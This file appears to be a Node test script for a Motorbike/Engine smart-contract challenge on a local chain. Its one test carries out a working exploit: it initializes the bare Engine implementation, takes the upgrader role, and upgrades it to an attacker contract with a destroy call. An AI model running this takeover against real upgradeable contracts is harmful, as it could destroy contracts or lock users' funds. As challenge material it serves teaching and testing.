import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { ethers } from "ethers";
import { readFile } from "node:fs/promises";

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

const engineArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/Motorbike.sol/Engine.json",
    "utf8"
  )
);

const motorbikeArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/Motorbike.sol/Motorbike.json",
    "utf8"
  )
);

const attackerArtifact = JSON.parse(
  await readFile(
    "artifacts/contracts/MotorbikeAttacker.sol/MotorbikeAttacker.json",
    "utf8"
  )
);

const IMPLEMENTATION_SLOT =
  "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

let admin;
let attacker;
let engine;
let motorbike;
let exploit;

beforeEach(async () => {
  admin = await provider.getSigner(0);
  attacker = await provider.getSigner(1);

  const engineFactory = new ethers.ContractFactory(
    engineArtifact.abi,
    engineArtifact.bytecode,
    admin
  );

  engine = await engineFactory.deploy();
  await engine.waitForDeployment();

  const motorbikeFactory = new ethers.ContractFactory(
    motorbikeArtifact.abi,
    motorbikeArtifact.bytecode,
    admin
  );

  motorbike = await motorbikeFactory.deploy(
    await engine.getAddress()
  );
  await motorbike.waitForDeployment();

  const exploitFactory = new ethers.ContractFactory(
    attackerArtifact.abi,
    attackerArtifact.bytecode,
    attacker
  );

  exploit = await exploitFactory.deploy();
  await exploit.waitForDeployment();
});

test("takes over Engine and upgrades it to the attacker implementation", async () => {
  const engineAddress = await engine.getAddress();
  const exploitAddress = await exploit.getAddress();

  const engineAsAttacker = new ethers.Contract(
    engineAddress,
    engineArtifact.abi,
    attacker
  );

  // Engine was initialized through delegatecall during proxy deployment,
  // but its own storage remains uninitialized.
  await (await engineAsAttacker.initialize()).wait();

  assert.equal(
    await engineAsAttacker.upgrader(),
    await attacker.getAddress()
  );

  const destroyData = exploit.interface.encodeFunctionData("destroy");

  // Upgrade Engine itself, not the Motorbike proxy.
  await (
    await engineAsAttacker.upgradeToAndCall(
      exploitAddress,
      destroyData
    )
  ).wait();

  const implementation = await provider.getStorage(
    engineAddress,
    IMPLEMENTATION_SLOT
  );

  assert.equal(
    ethers.getAddress("0x" + implementation.slice(-40)),
    exploitAddress
  );

  // The proxy still points to Engine.
  const proxyImplementation = await provider.getStorage(
    await motorbike.getAddress(),
    IMPLEMENTATION_SLOT
  );

  assert.equal(
    ethers.getAddress("0x" + proxyImplementation.slice(-40)),
    engineAddress
  );
});
